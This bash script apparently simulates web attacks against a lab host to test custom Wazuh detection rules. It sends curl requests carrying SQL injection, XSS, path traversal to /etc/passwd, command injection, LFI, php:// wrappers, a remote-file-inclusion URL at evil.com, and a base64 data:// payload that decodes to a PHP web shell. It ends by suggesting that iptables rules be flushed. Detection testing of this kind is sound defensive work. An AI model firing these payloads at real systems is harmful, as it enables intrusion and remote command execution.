#!/bin/bash
# Attack simulation for Scenario 02 - Web Attack Detection (full set)
# Target: 192.168.122.149
TARGET="http://192.168.122.149"
echo "[*] Starting FULL Web Attack Simulation against $TARGET"
echo "=================================================="
echo "[!] Make sure Active Response is DISABLED or perform a cleanup BEFORE starting!"
echo ""
# 1. Soft scanner (Nikto UA) - Rule 100020
echo "[1] Soft scanner (Nikto UA) - Rule 100020"
curl -s -A "Nikto/2.1.6" "$TARGET/" > /dev/null
sleep 1
# 2. SQL Injection - Rule 100021
echo "[2] SQL Injection - Rule 100021"
curl -s "$TARGET/?id=1%27%20OR%20%271%27%3D%271" > /dev/null
curl -s "$TARGET/?id=1%27%20UNION%20SELECT%201,2,3--" > /dev/null
sleep 1
# 3. XSS - Rule 100022
echo "[3] XSS - Rule 100022"
curl -s "$TARGET/?q=%3Cscript%3Ealert(1)%3C/script%3E" > /dev/null
curl -s "$TARGET/?q=<script>alert(1)</script>" > /dev/null
curl -s "$TARGET/?q=javascript:alert(1)" > /dev/null
sleep 1
# 4. Path Traversal / Directory Traversal - Rule 100023
echo "[4] Path Traversal - Rule 100023"
curl -s "$TARGET/?file=../../../../etc/passwd" > /dev/null
curl -s "$TARGET/?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd" > /dev/null
curl -s "$TARGET/?page=....//....//....//etc/passwd" > /dev/null
sleep 1
# 5. Command Injection - Rule 100024
echo "[5] Command Injection - Rule 100024"
curl -s "$TARGET/?cmd=%3Bid" > /dev/null
curl -s "$TARGET/?cmd=;id" > /dev/null
curl -s "$TARGET/?cmd=%7Cid" > /dev/null
curl -s "$TARGET/?cmd=\`id\`" > /dev/null
sleep 1
# 6. Local File Inclusion (LFI) - usually 100025 / 100026
echo "[6] LFI / Local File Inclusion - Rule 100025/100026"
curl -s "$TARGET/?page=../../../../etc/passwd" > /dev/null
curl -s "$TARGET/?file=....//....//....//etc/passwd%00" > /dev/null
curl -s "$TARGET/?include=/etc/passwd" > /dev/null
sleep 1
# 7. PHP Filter / Wrapper (often 100026 or 100029)
echo "[7] PHP Filter / php://wrapper - Rule 100026/100029"
curl -s "$TARGET/?x=php://filter/convert.base64-encode/resource=index.php" > /dev/null
curl -s "$TARGET/?page=php://filter/resource=index.php" > /dev/null
curl -s "$TARGET/?file=php://input" > /dev/null
sleep 1
# 8. Suspicious patterns / RFI / others
echo "[8] Suspicious patterns / RFI - Rule 100029+"
curl -s "$TARGET/?x=php://filter/resource=index.php" > /dev/null
curl -s "$TARGET/?url=http://evil.com/shell.txt" > /dev/null
curl -s "$TARGET/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+" > /dev/null
sleep 1
echo "=================================================="
echo "[+] Simulation finished."
echo "[+] Check Wazuh Dashboard: rule.id:100020 OR rule.id:100021 OR rule.id:100022 OR rule.id:100023 OR rule.id:100024 OR rule.id:100025 OR rule.id:100026 OR rule.id:100029"
echo ""
echo "If alerts are still missing -> Active Response is still blocking. Run:"
echo "  1. sudo iptables -F && sudo iptables -X"
echo "  2. Or temporarily comment out <active-response> in ossec.conf and restart the manager"
